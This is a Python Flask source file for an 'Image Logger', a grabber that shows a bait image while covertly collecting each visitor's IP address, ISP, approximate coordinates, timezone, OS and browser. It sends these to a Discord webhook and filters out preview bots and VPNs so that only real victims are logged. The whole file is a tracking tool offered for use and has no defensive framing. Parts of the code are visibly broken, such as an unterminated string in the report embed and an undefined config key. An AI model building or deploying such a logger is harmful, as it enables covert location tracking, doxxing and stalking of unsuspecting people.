from flask import Flask, request, render_template
import requests
import httpagentparser
import base64
import json

app = Flask(__name__)

# Configuration
config = {
    "webhook": "https://discord.com/api/webhooks/your/webhook",
    "image": "https://link-to-your-image.here",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "vpnCheck": 1,
    "antiBot": 1,
}

blacklisted_ips = ("27", "104", "143", "164")

def bot_check(ip, user_agent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif user_agent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def make_report(ip, user_agent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklisted_ips):
        return

    bot = bot_check(ip, user_agent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    ping = "@everyone"

    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(user_agent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{info['lat']}, {info['lon']}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
          }],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    return info

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/logger')
def logger():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        url = config["image"]

        result = make_report(ip, user_agent, None, request.path, url)

        data = f"""<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>"""

        return data
    except Exception as e:
        return "500 - Internal Server Error", 500

if __name__ == '__main__':
    app.run(debug=True)
